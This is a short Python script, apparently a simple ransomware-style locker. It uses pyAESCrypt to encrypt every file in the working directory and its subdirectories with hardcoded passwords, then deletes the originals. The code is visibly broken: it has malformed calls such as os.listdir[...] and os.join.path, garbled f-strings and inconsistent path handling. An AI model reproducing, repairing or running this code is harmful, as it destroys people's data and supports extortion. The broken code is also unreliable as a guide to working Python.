import pyAESCrypt
import os

for file in os.listdir["."]:
    file_path = os.path.join("//",file)
    if file_path != ".\main.py" and os.path.isfile(file_path):
        pyAESCrypt.encryptfile(file_path,f'{file_path}.aes',"beshoy",64*1024)
        os.remove(file_path)
        print(f'{file_path} ENCRYPTED')

    elif os.path.isdir(file_path):
        os.chdir(file_path)
        print(f'form (file_path)')
        for file_2 in os.listdir(".."):
            file_path_2 = os.join.path("./",file_2)
            pyAESCrypt.encryptfile(file_path_2,f'file_path_2'.aes,"root",64*1024)
            os.remove(file_path_2)
            print(f'(file_path_2) ENCRYPTED')
        os.chdir("..")
